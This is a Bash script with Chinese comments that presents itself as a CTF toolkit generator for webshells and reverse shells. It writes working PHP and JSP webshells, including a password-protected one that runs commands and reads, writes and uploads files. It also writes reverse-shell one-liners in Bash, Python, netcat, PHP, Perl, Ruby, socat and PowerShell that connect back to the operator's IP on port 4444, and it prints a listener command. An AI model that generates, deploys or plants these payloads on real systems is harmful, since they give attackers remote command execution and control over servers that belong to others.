#!/bin/bash
# CTF Webshell/反弹Shell生成器
# 用法: bash webshell.sh [TYPE]
# TYPE: php, jsp, asp, python, bash, nc, powershell, all

TYPE="${1:-all}"
OUTDIR="/root/ctf-toolkit/payloads/generated"
mkdir -p "$OUTDIR"

echo "=========================================="
echo "  Webshell/反弹Shell生成器"
echo "  输出目录: $OUTDIR"
echo "=========================================="

MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
MY_IP="${MY_IP:-10.10.10.1}"

gen_php() {
    echo "[*] 生成PHP Webshell..."
    # 简单一句话
    cat > "$OUTDIR/shell.php" << 'EOF'
<?php if($_POST["pass"]=="ctf"){echo "<pre>".shell_exec($_POST["cmd"])."</pre>";}?>
EOF
    # 密码保护大马
    cat > "$OUTDIR/shell_full.php" << 'EOF'
<?php
@ini_set('display_errors',0);
@set_time_limit(0);
$pass='ctf';
if($_POST['pass']==$pass){
    echo '<pre>';
    if($_POST['a']=='cmd'){echo shell_exec($_POST['c']);}
    elseif($_POST['a']=='read'){echo htmlspecialchars(file_get_contents($_POST['f']));}
    elseif($_POST['a']=='write'){file_put_contents($_POST['f'],$_POST['d']);echo 'OK';}
    elseif($_POST['a']=='upload'){move_uploaded_file($_FILES['f']['tmp_name'],$_POST['p']);echo 'OK';}
    elseif($_POST['a']=='info'){phpinfo();}
    echo '</pre>';
}else{echo '<form method=post><input name=pass><input name=a value=cmd><input name=c><input type=submit></form>';}
?>
EOF
    # 反弹shell
    cat > "$OUTDIR/reverse.php" << EOF
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${MY_IP}/4444 0>&1'");?>
EOF
    echo "  shell.php (一句话, pass=ctf)"
    echo "  shell_full.php (功能大马)"
    echo "  reverse.php (反弹shell)"
}

gen_jsp() {
    echo "[*] 生成JSP Webshell..."
    cat > "$OUTDIR/shell.jsp" << 'EOF'
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while((line=br.readLine())!=null){out.println(line);}
}
%>
EOF
    cat > "$OUTDIR/reverse.jsp" << EOF
<%@ page import="java.util.*,java.io.*,java.net.*"%>
<%
Socket s=new Socket("${MY_IP}",4444);
Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-i"});
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}
s.close();
%>
EOF
    echo "  shell.jsp"
    echo "  reverse.jsp"
}

gen_python() {
    echo "[*] 生成Python反弹Shell..."
    cat > "$OUTDIR/reverse.py" << EOF
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("${MY_IP}",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
EOF
    echo "  reverse.py"
}

gen_bash() {
    echo "[*] 生成Bash反弹Shell..."
    cat > "$OUTDIR/reverse.sh" << EOF
bash -i >& /dev/tcp/${MY_IP}/4444 0>&1
EOF
    cat > "$OUTDIR/reverse_all.sh" << EOF
# Bash
bash -i >& /dev/tcp/${MY_IP}/4444 0>&1

# Python
/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${MY_IP}",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Netcat (no -e)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${MY_IP} 4444 >/tmp/f

# PHP
php -r '\$sock=fsockopen("${MY_IP}",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;\$i="${MY_IP}";\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("${MY_IP}",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${MY_IP}:4444

# PowerShell
powershell -nop -c "\$client = New-Object System.Net.Sockets.TCPClient('${MY_IP}',4444);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
EOF
    echo "  reverse.sh (bash)"
    echo "  reverse_all.sh (全语言反弹shell)"
}

case "$TYPE" in
    php)      gen_php ;;
    jsp)      gen_jsp ;;
    python)   gen_python ;;
    bash)     gen_bash ;;
    all)      gen_php; gen_jsp; gen_python; gen_bash ;;
    *)        echo "未知类型: $TYPE"; echo "支持: php,jsp,python,bash,all" ;;
esac

echo -e "\n[*] 监听命令: nc -lvnp 4444"
echo "=========================================="
echo "生成完成! 文件在: $OUTDIR"
echo "=========================================="
